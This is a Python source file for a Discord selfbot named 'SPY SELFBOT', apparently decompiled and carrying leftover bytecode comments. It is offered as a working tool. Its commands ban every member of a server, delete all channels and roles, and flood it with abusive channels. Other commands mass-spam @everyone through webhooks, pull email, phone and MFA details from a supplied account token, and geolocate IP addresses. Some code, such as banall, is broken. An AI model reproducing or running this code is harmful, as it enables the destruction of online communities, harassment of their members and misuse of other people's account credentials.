import discord
from discord.ext import commands
import asyncio, random, os, requests, sys, threading, datetime, json, aiohttp
from urllib import parse
import re, time
from colorama import Fore
import os

print('LOADING SPY SELFBOT....Till then consider joining my discord server or follow me on instagram')

#  L. 112         0  LOAD_CONST               None
#                 2  RETURN_VALUE
#               4_0  COME_FROM            82  '82'

#  L. 113         4  FOR_ITER             84  'to 84'
#                 6  STORE_FAST               'friend'

#  L. 114         8  SETUP_EXCEPT         40  'to 40'

#  L. 115        10  LOAD_GLOBAL              getchat
#                12  LOAD_FAST                'token'
#                14  LOAD_FAST                'friend'
#                16  LOAD_STR                 'id'
#                18  BINARY_SUBSCR
#                20  CALL_FUNCTION_2       2  '2 positional arguments'
#                22  STORE_FAST               'chat_id'

#  L. 116        24  LOAD_GLOBAL              send_message
#                26  LOAD_FAST                'token'
#                28  LOAD_FAST                'chat_id'
#                30  LOAD_FAST                'form_data'
#                32  CALL_FUNCTION_3       3  '3 positional arguments'
#                34  POP_TOP
#                36  POP_BLOCK
#                38  JUMP_FORWARD         74  'to 74'
#              40_0  COME_FROM_EXCEPT      8  '8'

#  L. 117        40  DUP_TOP
#                42  LOAD_GLOBAL              Exception
#                44  COMPARE_OP               exception-match
#                46  POP_JUMP_IF_FALSE    72  'to 72'
#                48  POP_TOP
#                50  STORE_FAST               'e'
#                52  POP_TOP
#                54  SETUP_FINALLY        60  'to 60'

#  L. 118        56  POP_BLOCK
#                58  LOAD_CONST               None
#              60_0  COME_FROM_FINALLY    54  '54'
#                60  LOAD_CONST               None
#                62  STORE_FAST               'e'
#                64  DELETE_FAST              'e'
#                66  END_FINALLY
#                68  POP_EXCEPT
#                70  JUMP_FORWARD         74  'to 74'
#              72_0  COME_FROM            46  '46'
#                72  END_FINALLY
#              74_0  COME_FROM            70  '70'
#              74_1  COME_FROM            38  '38'

#  L. 119        74  LOAD_GLOBAL              sleep
#                76  LOAD_FAST                'delay'
#                78  CALL_FUNCTION_1       1  '1 positional argument'
#                80  POP_TOP
#                82  JUMP_BACK             4  'to 4'
#                84  POP_BLOCK

# Parse error at or near `None' instruction at offset -1

prefix = input('SPY SB | PREFIX : ')
token = input('SPY SB | TOKEN: ')
password = input('SPY SB| PASSWORD: ')
client = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True)
client.remove_command(name='help')
os.system('cls' if os.name == 'nt' else 'clear')
os.system('cls' if os.name == 'nt' else 'clear')

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Streaming(name='SPY SELFBOT OP', url='http://www.twitch.tv/dheeran2010'))
    print('Im Ready\nRisinPlayZ OP')


@client.command(pass_context=True)
async def help(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='SPY SELFBOT')
    embed.set_thumbnail(url='https://i.imgur.com/ZUbZ55y.gif')
    embed.set_footer(text='Created by RisinPlayZ')
    embed.add_field(name='>help', value='```Shows Help Cmds```')
    embed.add_field(name='>text', value='```Shows Text Cmds```')
    embed.add_field(name='>hack', value='```Shows hack Cmds```')
    embed.add_field(name='>nuke', value='```Shows nuke Cmds```')
    embed.add_field(name='>misc', value='```Shows misc Cmds```')
    await ctx.send(embed=embed)


@client.command(pass_context=True)
async def text(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='SPY SELFBOT | TEXT CMDS')
    embed.set_footer(text='Created by RisinPlayZ')
    embed.add_field(name='>spam', value='```Spams the chat \nParameters- >spam <int> <msg> \nEx- >spam 50 TEAM SPY OP```')
    embed.add_field(name='>purge', value='```Deletes Your messages\nParameters- >purge <int>\nEx- >purge 50```')
    embed.add_field(name='>embed', value='```Send your Message in an Embed\nParameters- >embed <text>\nEx- >embed RisinPlayZ is OP```')
    embed.add_field(name='>firstmsg', value='```Shows the first message of the chat with a jump buton\nParameters- >firstmsg\nEx- >firstmsg```')
    await ctx.send(embed=embed)


@client.command(pass_context=True)
async def hack(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='SPY SELFBOT | HACK CMDS')
    embed.set_footer(text='Created by RisinPlayZ')
    embed.add_field(name='>ip', value='```Displays info on an IP \nParameters- >ip <target> \nEx- >ip 162.159.128.233```')
    embed.add_field(name='>doxuser', value='```Displays info on a user | Only works in a server\nParameters- >doxuser <@target> \nEx- >doxuser @RisinPlayZ```')
    embed.add_field(name='>doxtoken', value='```Displays info on a Discord Account \nParameters- >tdox <target-token> \nEx- >tdox mfa.W3Di4FprRZ_AXH_Y5-A9ReoshSu9Dzn_fTXrvBhwc6p3LvkYLJM4jbr338YUMZ7ECnj2zbxnKm-I2ReFh2Zp```')
    embed.add_field(name='>doxserver', value='```Displays info on a Discord Server\nParameters- >doxserver\nEx- >doxserver```')
    embed.add_field(name='>pingweb', value='```Pings the website to check whether its operational or not.\nParameters- >pingweb <website url>\nEx- >pingweb https://discord.com/```')
    embed.add_field(name='>getroles', value='```Sends all roles of a server which you dont have the perm to view | Note - Use a spam channel.\nParameters- >getroles\nEx- >getroles```')
    await ctx.send(embed=embed)


@client.command(pass_context=True)
async def nuke(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='SPY SELFBOT | NUKE CMDS')
    embed.set_footer(text='Created by RisinPlayZ')
    embed.add_field(name='>trash', value='```Destruction 2021\nParameters- >trash <Target-server-ID> | Admin Perms Required\nEx- >trash 810480167453196299```')
    embed.add_field(name='>rc', value='```Renames every channel to the name provided\nParameters- >rc <name>\nEx- >rc RisinPlayZ op bolte```')
    embed.add_field(name='>rr', value='```Renames every role to the name provided\nParameters- >rr <name>\nEx- >rr RisinPlayZ op bolte```')
    embed.add_field(name='>webhookspam', value='```Creates multiple webhooks in every channel and Spams everyone with webhook in all channel\nParameters- >webhookspam\nEx- >webhookspam```')
    embed.add_field(name='>stopwebhookspam', value='```Stops the ongoing spam\nParameters- >stopwebhookspam\nEx- >stopwebhookspam```')
    embed.add_field(name='>spamgcname', value='```Spam Changes Group chat name\nParameters- >spamgcname\nEx- >spamgcname```')
    embed.add_field(name='>delwebhook', value='```Deletes a webhook\nParameters- >delwebhook <webhook>\nEx- >delwebhook https://discordapp.com/api/webhooks/752659248508305488/JnMq-sBIN3IMgDpzgT-KnpFDLEBdQs8AO9sD-_3STGk_ijmyqeKrop3kYSV6lb4ry8S```')
    await ctx.send(embed=embed)


@client.command(pass_context=True)
async def misc(ctx):
    embed = discord.Embed(color=0)
    embed.set_author(name='SPY SELFBOT | MISC CMDS')
    embed.set_footer(text='Created by RisinPlayZ')
    embed.add_field(name='>renameserver', value='```Renames the server name\nParameters- >renameserver <name>\nEx- >renameserver TEAM SPY OP```')
    await ctx.send(embed=embed)


@client.command()
async def spam(ctx, amount: int, *, message):
    for _i in range(amount):
        await ctx.send(message)


@client.command(aliases=[
 'geolocate', 'iplookup', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str='1.3.3.7'):
    r = requests.get(f"http://extreme-ip-lookup.com/json/{ipaddr}")
    geo = r.json()
    em = discord.Embed()
    fields = [
     {'name':'IP',
      'value':geo['query']},
     {'name':'Type',
      'value':geo['ipType']},
     {'name':'Country',
      'value':geo['country']},
     {'name':'City',
      'value':geo['city']},
     {'name':'Continent',
      'value':geo['continent']},
     {'name':'Country',
      'value':geo['country']},
     {'name':'Hostname',
      'value':geo['ipName']},
     {'name':'ISP',
      'value':geo['isp']},
     {'name':'Latitute',
      'value':geo['lat']},
     {'name':'Longitude',
      'value':geo['lon']},
     {'name':'Org',
      'value':geo['org']},
     {'name':'Region',
      'value':geo['region']}]
    for field in fields:
        if field['value']:
            em.add_field(name=(field['name']), value=(field['value']), inline=True)

    return await ctx.send(embed=em)


languages = {'hu':'Hungarian, Hungary',
 'nl':'Dutch, Netherlands',
 'no':'Norwegian, Norway',
 'pl':'Polish, Poland',
 'pt-BR':'Portuguese, Brazilian, Brazil',
 'ro':'Romanian, Romania',
 'fi':'Finnish, Finland',
 'sv-SE':'Swedish, Sweden',
 'vi':'Vietnamese, Vietnam',
 'tr':'Turkish, Turkey',
 'cs':'Czech, Czechia, Czech Republic',
 'el':'Greek, Greece',
 'bg':'Bulgarian, Bulgaria',
 'ru':'Russian, Russia',
 'uk':'Ukranian, Ukraine',
 'th':'Thai, Thailand',
 'zh-CN':'Chinese, China',
 'ja':'Japanese',
 'zh-TW':'Chinese, Taiwan',
 'ko':'Korean, Korea'}
locales = [
 'da', 'de', 'en-GB', 'en-US', 'es-ES', 'fr', 'hr', 'it', 'lt', 'hu', 'nl',
 'no', 'pl', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'el', 'bg',
 'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'ko']

@client.command(aliases=['tdox', 'doxtoken'])
async def tokeninfo(ctx, _token):
    headers = {'Authorization':_token,
     'Content-Type':'application/json'}
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me',
          headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {'Authorization':'Bot ' + _token,
         'Content-Type':'application/json'}
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me',
              headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
            fields = [
             {'name':'Flags',
              'value':res['flags']},
             {'name':'Local language',
              'value':res['locale'] + (f"{language}")},
             {'name':'Verified',
              'value':res['verified']}]
            for field in fields:
                if field['value']:
                    em.add_field(name=(field['name']),
                      value=(field['value']),
                      inline=False)
                    em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")

            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send('Invalid token')

    em = discord.Embed(description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
    nitro_type = 'None'
    if 'premium_type' in res:
        if res['premium_type'] == 2:
            nitro_type = 'Nitro Premium'
        elif res['premium_type'] == 1:
            nitro_type = 'Nitro Classic'
    fields = [
     {'name':'Phone',  'value':res['phone']},
     {'name':'Flags',
      'value':res['flags']},
     {'name':'Local language',
      'value':res['locale'] + (f"{language}")},
     {'name':'MFA',
      'value':res['mfa_enabled']},
     {'name':'Verified',
      'value':res['verified']},
     {'name':'Nitro',
      'value':nitro_type}]
    for field in fields:
        if field['value']:
            em.add_field(name=(field['name']),
              value=(field['value']),
              inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
            em.set_footer(text='Created by RisinPlayZ')

    return await ctx.send(embed=em)


def RandomColor():
    randcolor = discord.Color(random.randint(0, 16777215))
    return randcolor


@client.command(aliases=['trash', 'wizz'])
async def destroy(ctx):
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass

    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass

    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

    try:
        await ctx.guild.edit(name='TRASHED BY RISINPLAYZ',
          description='RisinPlayZ got no chill',
          reason='ripped by RisinPlayZ',
          icon=None,
          banner=None)
    except:
        pass

    for _i in range(100):
        await ctx.guild.create_text_channel(name='spy runs you')

    for _i in range(100):
        await ctx.guild.create_role(name='spy fucks you', color=(RandomColor()))


format = '%a, %d %b %Y | %H:%M:%S %ZGMT'



@client.command(aliases=['deletewebhook'])
async def delwebhook(ctx, link=None):
    if link == None:
        embed = discord.Embed(title='SPY SELFBOT', description='```>delwebhook <webhook>```')
        embed.set_footer(text='Created By RisinPlayZ')
        await ctx.message.edit(content='', embed=embed)
    else:
        embed = discord.Embed(title='SPY SELFBOT', description=f"Sending a delete request to\n{link}")
        embed.set_footer(text='Created by RisinPlayZ')
        await ctx.message.edit(content='', embed=embed)
        result = requests.delete(link)
        if result.status_code == 204:
            embed = discord.Embed(title='SPY SELFBOT', description='WEBHOOK DELETED')
            embed.set_footer(text='Created by RisinPlayZ')
            await ctx.message.edit(embed=embed)
        else:
            embed = discord.Embed(title='SPY SELBO', description=f"Delete request responded with status code : {result.status_code}\\{result.text}")
            embed.set_footer(text='Created by RisinPlayZ')
            await ctx.message.edit(embed=embed)


@client.command()
async def purge(ctx, amount: int=None):
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass

    else:
        async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass


@client.command()
async def av(ctx, *, avamember):
    user = client.get_user(avamember)
    await ctx.send(f"{user.avatar_url}")


@client.command()
async def pingweb(ctx, website=None):
    await ctx.send(f"Pinging {website} with 32 bytes of data:")
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            try:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            finally:
                e = None
                del e

        if r == 404:
            await ctx.send(f"Website is down, status = ({r})")
        else:
            await ctx.send(f"Website is operational, status = ({r})")
            await ctx.send('Timed out')


@client.command()
async def ping(ctx, ipp=None):
    await ctx.send(f"Pinging {ipp} with 32 bytes of data:")
    await ctx.send('Timed out.')


@client.command(aliases=['whois'])
async def doxuser(ctx, member: discord.Member=None):
    if not member:
        member = ctx.message.author
    roles = [role for role in member.roles]
    embed = discord.Embed(colour=(discord.Colour.default()), timestamp=(ctx.message.created_at), title=f"User Info - {member}")
    embed.set_thumbnail(url=(member.avatar_url))
    embed.set_footer(text='Created By RisinPlayZ')
    embed.add_field(name='ID:', value=(member.id))
    embed.add_field(name='Display Name:', value=(member.display_name))
    embed.add_field(name='Created Account On:', value=(member.created_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')))
    embed.add_field(name='Joined Server On:', value=(member.joined_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')))
    embed.add_field(name='Roles:', value=(''.join([role.mention for role in roles])))
    embed.add_field(name='Highest Role:', value=(member.top_role.mention))
    print(member.top_role.mention)
    await ctx.send(embed=embed)


@client.command(aliases=['roles'])
async def getroles(ctx):
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ''
    for role in roles:
        if role.name == '@everyone':
            roleStr += '@\u200beveryone'
        else:
            roleStr += role.name + '\n'

    print(roleStr)
    await ctx.send(roleStr)


@client.command(aliases=['renameserver', 'nameserver'])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


@client.command()
async def hastebin(ctx, *, message):
    r = requests.post('https://hastebin.com/documents', data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")


@client.command(aliases=['spamchangegcname', 'changegcname'])
async def spamgcname(ctx):
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = 'SPY RUNS YOU'
        name = ''
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)


@client.command
def banall(i):
    while True:
        r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{i}", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
            print(f"Got ratelimited, retrying after:  {r.json()['retry_after']} s.")
        else:
            break


@client.command(name='first-message',
  aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel=None):
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=(first_message.content))
    embed.add_field(name='First Message',
      value=f"[Click here to Jump]({first_message.jump_url})")
    embed.set_footer(text='Created by RisinPlayZ')
    await ctx.send(embed=embed)


def ssspam(webhook):
    while spammingdawebhookeroos:
        randcolor = random.randint(0, 16777215)
        data = {'content':'@everyone SPY RUNS CORD',
         'embeds':[
          {'title':'SPY SELFBOT OP',
           'tts':'true',
           'description':'.',
           'url':'https://instragram.com/risinplayz',
           'color':randcolor,
           'fields':[
            {'name':'SPY SELFBOT',
             'value':'.'},
            {'name':'SPY SELFBOT',
             'value':'.'},
            {'name':'SPY SELFBOT',
             'value':'.'},
            {'name':'.',
             'value':'.'}],
           'author':{'name':'SPY SELFBOT',
            'url':'https://imgur.com/Lib5iyC',
            'icon_url':'https://imgur.com/Lib5iyC'},
           'footer':{'text':'Created by RisinPlayZ',
            'icon_url':'https://imgur.com/Lib5iyC'},
           'image':{'url': 'https://imgur.com/Lib5iyC'},
           'thumbnail':{'url': 'https://imgur.com/Lib5iyC'}},
          {'url':'https://instgram.com/risinplayz',
           'image':{'url': 'https://imgur.com/Lib5iyC'}},
          {'url':'https://instagram.com/risinplayz',
           'image':{'url': 'https://imgur.com/Lib5iyC'}},
          {'url':'https://instagram.com/risinplayz',
           'image':{'url': 'https://imgur.com/Lib5iyC'}}],
         'username':'WIZZED BY RISINPLAYZ',
         'avatar_url':'https://imgur.com/Lib5iyC'}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@client.command(aliases=['webhookfuck', 'spamwebhooks', 'webhooknuke', 'webhooksnuke', 'webhooksfuck', 'spamwebhook'])
async def webhookspam(ctx):
    global spammingdawebhookeroos
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url,)).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Wizzed by RisinPlayZ')
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print(f"{Fore.RED} > Webhook Error")


@client.command(aliases=['stopwebhookfuck', 'webhookstop', 'webhookspamstop', 'stopwebhooksspam', 'webhookspamoff'])
async def stopwebhookspam(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass

    spammingdawebhookeroos = False


@client.command()
async def embed(ctx, *, description):
    embed = discord.Embed(title='SPY SELFBOT', description=description)
    embed.set_footer(text='Created by RisinPlayZ')
    await ctx.send(embed=embed)


@client.command(aliases=['rc'])
async def renamechannels(ctx, *, name):
    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@client.command(aliases=['rr'])
async def renameroles(ctx, *, name):
    for role in ctx.guild.roles:
        await role.edit(name=name)


client.run(token, bot=False)
